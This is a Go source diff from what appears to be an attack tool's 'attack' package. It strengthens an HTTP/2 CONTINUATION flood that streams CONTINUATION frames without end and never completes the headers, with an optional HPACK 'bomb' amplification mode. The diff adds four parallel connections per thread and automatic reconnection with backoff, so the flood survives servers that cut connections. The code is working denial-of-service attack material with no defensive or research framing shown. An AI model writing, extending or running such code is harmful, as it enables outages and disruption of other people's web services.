@@ -3,6 +3,7 @@ package attack
 import (
 	"bytes"
 	"log"
+	"net"
 	"strings"
 	"sync"
 	"sync/atomic"
@@ -95,7 +96,10 @@ func buildBombRefBlock(enc *hpack.Encoder, buf *bytes.Buffer) []byte {
 
 // startH2ContinuationLoop 共享攻击循环。
 // bombMode: true=HPACK 放大填充；false=普通合法填充。
+// 每线程 contConnsPerThread 条连接并行（单连接受 TCP 窗口限制，
+// 槽间互相隐藏拨号 RTT；连接被服务器掐断后退避重连，不退出）。
 func startH2ContinuationLoop(s *AttackSession, cfg AttackConfig, addr, scheme, authority string, useTLS, bombMode bool) {
+	const contConnsPerThread = 4
 	go func() {
 		var wg sync.WaitGroup
 		dur := time.Duration(cfg.Duration) * time.Second
@@ -105,94 +109,113 @@ func startH2ContinuationLoop(s *AttackSession, cfg AttackConfig, addr, scheme, a
 			go func(seed int64) {
 				defer wg.Done()
 				endTime := time.Now().Add(dur)
-				tc := newTimeCache()
 				path := "/"
 
-				conn, framer, err := dialH2(addr, useTLS, 5*time.Second)
-				if err != nil {
-					log.Printf("[h2_continuation] dial %s failed: %v", addr, err)
-					atomic.AddUint64(&s.Stats.Errors, 1)
-					return
-				}
-				rc := &h2ResetConn{conn: conn, framer: framer, streamID: 1}
-				rc.hpackEnc = hpack.NewEncoder(&rc.hpackBuf)
+				var slotWG sync.WaitGroup
+				for slot := 0; slot < contConnsPerThread; slot++ {
+					slotWG.Add(1)
+					go func() {
+						defer slotWG.Done()
+						tc := newTimeCache()
+						var conn net.Conn
+						var rc *h2ResetConn
+						var firstBlock, contBlock []byte
 
-				// 预编码各填充块（每连接一次，避免热路径反复编码）
-				plainBlock := buildPlainBlock(rc.hpackEnc, &rc.hpackBuf)
-				bombSeedBlock := buildBombSeedBlock(rc.hpackEnc, &rc.hpackBuf)
-				bombRefBlock := buildBombRefBlock(rc.hpackEnc, &rc.hpackBuf)
-
-				// 打开流的首个 header 块（HEADERS 帧）：bomb 模式携带大条目
-				firstBlock := plainBlock
-				if bombMode {
-					firstBlock = bombSeedBlock
-				}
-
-				for tc.since(endTime) < 0 {
-					select {
-					case <-s.StopChan:
-						return
-					default:
-					}
-
-					if !s.checkRate(maxContinuationPayload) {
-						time.Sleep(time.Microsecond * 100)
-						continue
-					}
-
-					// 打开新流（上一个流被服务器掐断或我们结束）
-					if err := rc.writeContinuationHeader(scheme, authority, path, firstBlock); err != nil {
-						conn.Close()
-						conn, framer, err = dialH2(addr, useTLS, 5*time.Second)
-						if err != nil {
-							atomic.AddUint64(&s.Stats.Errors, 1)
-							return
-						}
-						rc = &h2ResetConn{conn: conn, framer: framer, streamID: 1}
-						rc.hpackEnc = hpack.NewEncoder(&rc.hpackBuf)
-						atomic.AddUint64(&s.Stats.Errors, 1)
-						continue
-					}
-					atomic.AddUint64(&s.Stats.PacketsSent, 1)
-					atomic.AddUint64(&s.Stats.BytesSent, uint64(len(firstBlock)+50))
-
-					// 无限 CONTINUATION（永不 END_HEADERS；服务器断流后重连）
-					for tc.since(endTime) < 0 {
-						select {
-						case <-s.StopChan:
-							return
-						default:
-						}
-
-						block := plainBlock
-						if bombMode {
-							block = bombRefBlock
-						}
-
-						if !s.checkRate(maxContinuationPayload) {
-							time.Sleep(time.Microsecond * 100)
-							continue
-						}
-
-						if err := rc.writeContinuation(block); err != nil {
-							// 连接被服务器掐断（超限/GOAWAY）：重连开新流
-							conn.Close()
-							conn, framer, err = dialH2(addr, useTLS, 5*time.Second)
+						// 拨号/重连：失败退避重试，绝不退出。
+						// 成功时重建 HPACK 填充块（编码器索引随连接重置，
+						// 必须先 plain → bombSeed → bombRef 保持引用顺序）。
+						ensureConn := func() bool {
+							if rc != nil {
+								return true
+							}
+							c, framer, err := dialH2(addr, useTLS, 5*time.Second)
 							if err != nil {
 								atomic.AddUint64(&s.Stats.Errors, 1)
-								return
+								time.Sleep(100 * time.Millisecond)
+								return false
 							}
+							conn = c
 							rc = &h2ResetConn{conn: conn, framer: framer, streamID: 1}
 							rc.hpackEnc = hpack.NewEncoder(&rc.hpackBuf)
-							atomic.AddUint64(&s.Stats.Errors, 1)
-							break
+
+							plainBlock := buildPlainBlock(rc.hpackEnc, &rc.hpackBuf)
+							bombSeedBlock := buildBombSeedBlock(rc.hpackEnc, &rc.hpackBuf)
+							bombRefBlock := buildBombRefBlock(rc.hpackEnc, &rc.hpackBuf)
+
+							// 打开流的首个 header 块（HEADERS 帧）：bomb 模式携带大条目
+							firstBlock = plainBlock
+							contBlock = plainBlock
+							if bombMode {
+								firstBlock = bombSeedBlock
+								contBlock = bombRefBlock
+							}
+							return true
 						}
-						atomic.AddUint64(&s.Stats.PacketsSent, 1)
-						atomic.AddUint64(&s.Stats.BytesSent, uint64(len(block)))
-						tc.refresh()
-					}
+
+						for tc.since(endTime) < 0 {
+							select {
+							case <-s.StopChan:
+								if conn != nil {
+									conn.Close()
+								}
+								return
+							default:
+							}
+
+							if !ensureConn() {
+								continue
+							}
+							if !s.checkRate(maxContinuationPayload) {
+								time.Sleep(time.Microsecond * 100)
+								continue
+							}
+
+							// 打开新流（上一个流被服务器掐断或我们结束）
+							if err := rc.writeContinuationHeader(scheme, authority, path, firstBlock); err != nil {
+								conn.Close()
+								conn, rc = nil, nil
+								atomic.AddUint64(&s.Stats.Errors, 1)
+								continue
+							}
+							atomic.AddUint64(&s.Stats.PacketsSent, 1)
+							atomic.AddUint64(&s.Stats.BytesSent, uint64(len(firstBlock)+50))
+
+							// 无限 CONTINUATION（永不 END_HEADERS；服务器断流后重连）
+							for tc.since(endTime) < 0 {
+								select {
+								case <-s.StopChan:
+									if conn != nil {
+										conn.Close()
+									}
+									return
+								default:
+								}
+
+								block := contBlock
+
+								if !s.checkRate(maxContinuationPayload) {
+									time.Sleep(time.Microsecond * 100)
+									continue
+								}
+
+								if err := rc.writeContinuation(block); err != nil {
+									// 连接被服务器掐断（超限/GOAWAY）：重连开新流
+									conn.Close()
+									conn, rc = nil, nil
+									atomic.AddUint64(&s.Stats.Errors, 1)
+									break
+								}
+								atomic.AddUint64(&s.Stats.PacketsSent, 1)
+								atomic.AddUint64(&s.Stats.BytesSent, uint64(len(block)))
+								tc.refresh()
+							}
+						}
+						if conn != nil {
+							conn.Close()
+						}
+					}()
 				}
-				conn.Close()
+				slotWG.Wait()
 			}(int64(i))
 		}
 
